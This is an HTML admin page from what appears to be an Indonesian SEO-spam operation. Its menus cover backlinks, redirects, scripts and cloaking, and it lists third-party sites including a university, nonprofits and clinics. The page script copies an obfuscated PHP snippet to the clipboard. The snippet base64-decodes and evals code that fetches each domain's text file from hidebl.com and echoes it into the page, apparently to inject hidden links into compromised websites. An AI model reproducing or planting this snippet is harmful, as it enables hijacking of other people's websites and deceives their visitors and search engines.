
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Daftar Domain</title>
  <link rel="shortcut icon" type="image/png" href="https://206.189.152.204/assets/images/logos/favicon.png" />
  <link rel="stylesheet" href="https://206.189.152.204/assets/css/styles.min.css" />
</head>
<body>
  <div class="page-wrapper" id="main-wrapper" data-layout="vertical" data-navbarbg="skin6" data-sidebartype="full" data-sidebar-position="fixed" data-header-position="fixed">
    <aside class="left-sidebar">
      <div>
        <div class="brand-logo d-flex align-items-center justify-content-between">
          <a href="./index.html" class="text-nowrap logo-img">
            <h4 class="font-weight-bold">Dashboard</h4>
          </a>
          <div class="close-btn d-xl-none d-block sidebartoggler cursor-pointer" id="sidebarCollapse">
            <i class="ti ti-x fs-8"></i>
          </div>
        </div>
        <nav class="sidebar-nav scroll-sidebar" data-simplebar="">
          <ul id="sidebarnav">

            <li class="sidebar-item">
              <a class="sidebar-link" href="https://206.189.152.204/dashboard" aria-expanded="false">
                <span>
                  <i class="ti ti-layout-dashboard"></i>
                </span>
                <span class="hide-menu">Dashboard</span>
              </a>
            </li>

            <li class="sidebar-item">
              <a class="sidebar-link" href="https://206.189.152.204/domain" aria-expanded="false">
                <span>
                  <i class="ti ti-article"></i>
                </span>
                <span class="hide-menu">Domain</span>
              </a>
            </li>
            <li class="sidebar-item">
              <a class="sidebar-link" href="https://206.189.152.204/backlink" aria-expanded="false">
                <span>
                  <i class="ti ti-alert-circle"></i>
                </span>
                <span class="hide-menu">Backlink</span>
              </a>
            </li>
            <li class="sidebar-item">
                <a class="sidebar-link" href="https://206.189.152.204/redirects" aria-expanded="false">
                    <span>
                        
                        <i class="ti ti-link"></i>
                        
                        
                    </span>
                    <span class="hide-menu">Redirects</span>
                </a>
            </li>
            
            <li class="sidebar-item">
                <a class="sidebar-link" href="https://206.189.152.204/php_scripts" aria-expanded="false">
                    <span>
                        <i class="ti ti-file-code"></i> 
                        
                    </span>
                    <span class="hide-menu">Scripts</span>
                </a>
            </li>
            <li class="sidebar-item">
              <a class="sidebar-link" href="https://206.189.152.204/cloakings" aria-expanded="false">
                  <span>
                      <i class="ti ti-mask"></i> 
                  </span>
                  <span class="hide-menu">Cloaking</span>
              </a>
          </li>

            
            <li class="sidebar-item">
                <a class="sidebar-link" href="https://206.189.152.204/users" aria-expanded="false">
                    <span>
                        <i class="ti ti-users"></i> 
                        
                    </span>
                    <span class="hide-menu">Pengguna</span>
                </a>
            </li>
            <li class="sidebar-item">
              <a class="sidebar-link" href="https://206.189.152.204/google_site_verifications" aria-expanded="false">
                  <span>
                      <i class="ti ti-brand-google"></i> 
                  </span>
                  <span class="hide-menu">Verifikasi Situs Google</span>
              </a>
          </li>

            <li class="sidebar-item">
                <a class="sidebar-link" href="https://206.189.152.204/profile" aria-expanded="false">
                    <span>
                        <i class="ti ti-user"></i> 
                        
                    </span>
                    <span class="hide-menu">Kelola Profil</span>
                </a>
            </li>

            <!-- <li class="sidebar-item">
                <a class="sidebar-link" href="https://206.189.152.204/conditional_urls" aria-expanded="false">
                    <span>
                        <i class="ti ti-settings-automation"></i>

                    </span>
                    <span class="hide-menu">Conditional URLs</span>
                </a>
            </li> -->

          </ul>

        </nav>
      </div>
    </aside>
    <div class="body-wrapper">
      <header class="app-header">
        <nav class="navbar navbar-expand-lg navbar-light">
          <ul class="navbar-nav">
            <li class="nav-item d-block d-xl-none">
              <a class="nav-link sidebartoggler nav-icon-hover" id="headerCollapse" href="javascript:void(0)">
                <i class="ti ti-menu-2"></i>
              </a>
            </li>
          </ul>
          <div class="navbar-collapse justify-content-end px-0" id="navbarNav">
            <ul class="navbar-nav flex-row ms-auto align-items-center justify-content-end">
              <li class="nav-item dropdown">
                <a class="nav-link nav-icon-hover" href="javascript:void(0)" id="drop2" data-bs-toggle="dropdown" aria-expanded="false">
                  <img src="../assets/images/profile/user-1.jpg" alt="" width="35" height="35" class="rounded-circle">
                </a>
                <div class="dropdown-menu dropdown-menu-end dropdown-menu-animate-up" aria-labelledby="drop2">
                  <div class="message-body">
                    <a href="https://206.189.152.204/profile" class="d-flex align-items-center gap-2 dropdown-item">
                      <i class="ti ti-user fs-6"></i>
                      <p class="mb-0 fs-3">My Profile</p>
                    </a>

                    <a href="https://206.189.152.204/logout" class="btn btn-outline-primary mx-3 mt-2 d-block">Logout</a>
                  </div>
                </div>
              </li>
            </ul>
          </div>
        </nav>
      </header>
      <!-- content -->
      <div class="container-fluid">
        <div class="container">
    <div class="row">
        <div class="col-md-12">
            <div class="card">
                <div class="card-header">
                    <h2>Daftar Domain</h2>
                    <div class="card-tools">
                        <a href="https://206.189.152.204/domain/create" class="btn btn-primary btn-sm">
                            Tambah Domain Baru
                        </a>
                        <a href="https://206.189.152.204/domain/checkallcontent" class="btn btn-info btn-sm" onclick="return confirm('Ini akan memulai pengecekan konten untuk SEMUA domain. Proses ini mungkin memakan waktu. Lanjutkan?');">
                            Cek Semua Domain
                        </a>
                    </div>
                </div>
                <div class="card-body">
                    
                    
                    
                    <form action="https://206.189.152.204/domain" method="GET" class="mb-4">
                        <div class="row g-2">
                            <div class="col-md-6">
                                <div class="input-group">
                                    <input type="text" name="domain_search" class="form-control" placeholder="Cari berdasarkan domain..." value="">
                                    <button class="btn btn-outline-secondary" type="submit">Cari</button>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <select name="status_filter" class="form-select">
                                    <option value="">Filter Status</option>
                                    <option value="0" >Belum Pernah Dicek</option>
                                    <option value="1" >Aktif</option>
                                    <option value="2" >Gagal Diambil Konten</option>
                                    <option value="3" >Data Tidak Ada / Dihapus</option>
                                </select>
                            </div>
                            <div class="col-md-2">
                                                            </div>
                        </div>
                    </form>

                                            <div class="table-responsive">
                            <table class="table table-bordered table-striped">
                                <thead>
                                    <tr>
                                        <th>ID</th>
                                        <th>Domain</th>
                                        <th>Nilai</th>
                                        <th>Konten</th>
                                        <th>Keterangan</th>
                                        <th>Status</th>
                                        <th>Aksi</th>
                                    </tr>
                                </thead>
                                <tbody>
                                                                        <tr>
                                        <td>158</td>
                                        <td>www.trianglerrhh.es</td>
                                        <td>31</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-danger">Data Tidak Ada / Dihapus</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/158/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/www.trianglerrhh.es.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/158/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/158" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>156</td>
                                        <td>sbco.org.br</td>
                                        <td>50</td>
                                        <td>org.br</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-success">Aktif</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/156/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/sbco.org.br.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/156/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/156" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>155</td>
                                        <td>clinifemina.com.br</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-danger">Data Tidak Ada / Dihapus</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/155/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/clinifemina.com.br.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/155/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/155" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>153</td>
                                        <td>www.wearevulcan.com</td>
                                        <td>29</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-success">Aktif</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/153/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/www.wearevulcan.com.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/153/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/153" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>152</td>
                                        <td>uokirkuk.edu.iq</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-info">Status Tidak Dikenal</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/152/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/uokirkuk.edu.iq.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/152/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/152" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>151</td>
                                        <td>uokirkuk.edu.iq/ar</td>
                                        <td>35</td>
                                        <td>.edu.iq</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-success">Aktif</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/151/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/uokirkuk.edu.iq/ar.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/151/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/151" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>149</td>
                                        <td>www.campuspride.org</td>
                                        <td>70</td>
                                        <td>org</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-danger">Data Tidak Ada / Dihapus</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/149/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/www.campuspride.org.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/149/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/149" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>148</td>
                                        <td>projectgreenchallenge.com</td>
                                        <td>35</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-warning">Gagal Diambil Konten</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/148/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/projectgreenchallenge.com.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/148/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/148" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>147</td>
                                        <td>chickenspot.com</td>
                                        <td>8</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td>
                                                                                            <span class="badge bg-success">Aktif</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/147/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/chickenspot.com.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/147/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/147" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                        <tr>
                                        <td>142</td>
                                        <td>www.sultan-ul-ashiqeen.pk</td>
                                        <td>25</td>
                                        <td>pk</td>
                                        <td>pk</td>
                                        <td>
                                                                                            <span class="badge bg-success">Aktif</span>
                                                                                    </td>
                                        <td>
                                            <a href="https://206.189.152.204/domain/142/check-content" class="btn btn-info btn-sm" title="Cek Konten Website">Cek</a>

                                            <button class="btn btn-success btn-sm ti ti-files" onclick="copyToClipboard('https://hidebl.com/th/bl/www.sultan-ul-ashiqeen.pk.txt')"> </button>

                                            <a href="https://206.189.152.204/domain/142/edit" class="btn btn-warning btn-sm">Edit</a>

                                            <form action="https://206.189.152.204/domain/142" method="POST" onsubmit="return confirm('Apakah Anda yakin ingin menghapus domain ini?');" style="display:inline-block;">
                                                <input type="hidden" name="_token" value="6HzsU2Jq40itHTmhOrM3XTRZoRQM7WSQL46H3R6Q">                                                <input type="hidden" name="_method" value="DELETE">                                                <button type="submit" class="btn btn-danger btn-sm">Hapus</button>
                                            </form>
                                        </td>
                                    </tr>
                                                                    </tbody>
                            </table>
                        </div>

                        <div class="d-flex justify-content-center mt-4">
                            <nav class="d-flex justify-items-center justify-content-between">
        <div class="d-flex justify-content-between flex-fill d-sm-none">
            <ul class="pagination">
                
                                    <li class="page-item disabled" aria-disabled="true">
                        <span class="page-link">&laquo; Previous</span>
                    </li>
                
                
                                    <li class="page-item">
                        <a class="page-link" href="https://206.189.152.204/domain?page=2" rel="next">Next &raquo;</a>
                    </li>
                            </ul>
        </div>

        <div class="d-none flex-sm-fill d-sm-flex align-items-sm-center justify-content-sm-between">
            <div>
                <p class="small text-muted">
                    Showing
                    <span class="fw-semibold">1</span>
                    to
                    <span class="fw-semibold">10</span>
                    of
                    <span class="fw-semibold">32</span>
                    results
                </p>
            </div>

            <div>
                <ul class="pagination">
                    
                                            <li class="page-item disabled" aria-disabled="true" aria-label="&laquo; Previous">
                            <span class="page-link" aria-hidden="true">&lsaquo;</span>
                        </li>
                    
                    
                                            
                        
                        
                                                                                                                        <li class="page-item active" aria-current="page"><span class="page-link">1</span></li>
                                                                                                                                <li class="page-item"><a class="page-link" href="https://206.189.152.204/domain?page=2">2</a></li>
                                                                                                                                <li class="page-item"><a class="page-link" href="https://206.189.152.204/domain?page=3">3</a></li>
                                                                                                                                <li class="page-item"><a class="page-link" href="https://206.189.152.204/domain?page=4">4</a></li>
                                                                                                        
                    
                                            <li class="page-item">
                            <a class="page-link" href="https://206.189.152.204/domain?page=2" rel="next" aria-label="Next &raquo;">&rsaquo;</a>
                        </li>
                                    </ul>
            </div>
        </div>
    </nav>

                        </div>

                                    </div>
            </div>
        </div>
    </div>
</div>
<script>
    function htmlspecialcharsJS(str) {
        if (typeof str !== 'string') {
            return '';
        }
        return str.replace(/&quot;/g, '"')
                  .replace(/&#039;/g, "'")
                  .replace(/&gt;/g, '>')
                  .replace(/&lt;/g, '<')
                  .replace(/&amp;/g, '&');
    }

    function copyToClipboard(text) {
        let encodedPhpScript = "aWYgKGluaV9nZXQoJ2FsbG93X3VybF9mb3BlbicpKSB7CiAgICBlY2hvIEBmaWxlX2dldF9jb250ZW50cygkdXJsKTsKfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnY3VybF9pbml0JykpIHsKICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNTguMC4zMDI5LjExMCBTYWZhcmkvNTM3LjM2Jyk7CiAgICAgICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7CiAgICAgICAgY3VybF9jbG9zZSgkY2gpOwogICAgICAgIGVjaG8gJHJlc3BvbnNlOwp9";

        let fullScriptToCopy = htmlspecialcharsJS(
            '&lt;?php $url="'+text+'";$encodedScript = "' + encodedPhpScript + '";\n$decodedScript = base64_decode($encodedScript);eval($decodedScript);?&gt;'
        );

        var textarea = document.createElement("textarea");
        textarea.value = fullScriptToCopy;
        textarea.style.position = 'fixed';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        document.body.removeChild(textarea);

        alert("Script berhasil disalin ke clipboard untuk domain: " + text);
    }
</script>
      </div>
    </div>
  </div>
  <script src="https://206.189.152.204/assets/libs/jquery/dist/jquery.min.js"></script>
  <script src="https://206.189.152.204/assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://206.189.152.204/assets/js/sidebarmenu.js"></script>
  <script src="https://206.189.152.204/assets/js/app.min.js"></script>
  <!-- <script src="https://206.189.152.204/assets/libs/apexcharts/dist/apexcharts.min.js"></script> -->
  <script src="https://206.189.152.204/assets/libs/simplebar/dist/simplebar.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chosen/1.8.7/chosen.min.css" integrity="sha512-yVvxUQV0QESBt1SyZbNJMAwyKvFTLMyXSyBHDO4BG5t7k/Lw34tyqlSDlKIrIENIzCl+RVUNjmCPG+V/GMesRw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/chosen/1.8.7/chosen.jquery.min.js" integrity="sha512-rMGGF4wg1R73ehtnxXBt5mbUfN9JUJwbk21KMlnLZDJh7BkPmeovBuddZCENJddHYYMkCh9hPFnPmS9sspki8g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

 <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.19/css/dataTables.bootstrap4.min.css"/>
<script src="https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/1.10.19/js/dataTables.bootstrap4.min.js"></script>


<script>
//$(".chosen-select").chosen({no_results_text: "Oops, nothing found!"});
$(document).ready(function() {
    var table3 = $('#listbacklink').DataTable({
        "paging": false
    })

    $('#checkAllBacklink').on('click', function(){
        var rows = table3.rows({ 'search': 'applied' }).nodes();
        $('.backlinkrow', rows).prop('checked', this.checked);
    });


    var table = $('#listDomain').DataTable({
        "scrollX": false,
        "scrollY": 200 ,
        "paging": false,
        "autoWidth": true,
        "dom": '<"top"lf>rt<"bottom"ip><"clear">',
        'columnDefs': [{
            'targets': 0,
            'searchable': true,
            'orderable': false
        }],
        'order': [[1, 'asc']]
    });

    $('#checkAll').on('click', function(){
        var rows = table.rows({ 'search': 'applied' }).nodes();
        $('.domainrow', rows).prop('checked', this.checked);
    });

    $('#listDomain tbody').on('change', 'input[type="checkbox"]', function(){
        if(!this.checked){
            var el = $('#check-all').get(0);
            if(el && el.checked && ('indeterminate' in el)){
                el.indeterminate = true;
            }
        }
    });



    var table2 = $('#listDomain2').DataTable({
        "scrollX": false,
        "scrollY": 200 ,
        "paging": false,
        "autoWidth": true,
        "dom": '<"top"lf>rt<"bottom"ip><"clear">',
        'columnDefs': [{
            'targets': 0,
            'searchable': true,
            'orderable': false
        }],
        'order': [[1, 'asc']]
    });

    $('#checkAll2').on('click', function(){
        var rows = table2.rows({ 'search': 'applied' }).nodes();
        $('.domainlist2', rows).prop('checked', this.checked);
    });

    $('#listDomain2 tbody').on('change', 'input[type="checkbox"]', function(){
        if(!this.checked){
            var el = $('#check-all2').get(0);
            if(el && el.checked && ('indeterminate' in el)){
                el.indeterminate = true;
            }
        }
    });



    var table3 = $('#listDomain3').DataTable({
        "scrollX": false,
        "scrollY": 200 ,
        "paging": false,
        "autoWidth": true,
        "dom": '<"top"lf>rt<"bottom"ip><"clear">',
        'columnDefs': [{
            'targets': 0,
            'searchable': true,
            'orderable': false
        }],
        'order': [[1, 'asc']]
    });

    $('#checkAll3').on('click', function(){
        var rows = table3.rows({ 'search': 'applied' }).nodes();
        $('.domainlist3', rows).prop('checked', this.checked);
    });

    $('#listDomain3 tbody').on('change', 'input[type="checkbox"]', function(){
        if(!this.checked){
            var el = $('#check-all2').get(0);
            if(el && el.checked && ('indeterminate' in el)){
                el.indeterminate = true;
            }
        }
    });
});

</script>
  <!-- <script src="https://206.189.152.204/assets/js/dashboard.js"></script> -->
</body>

</html>
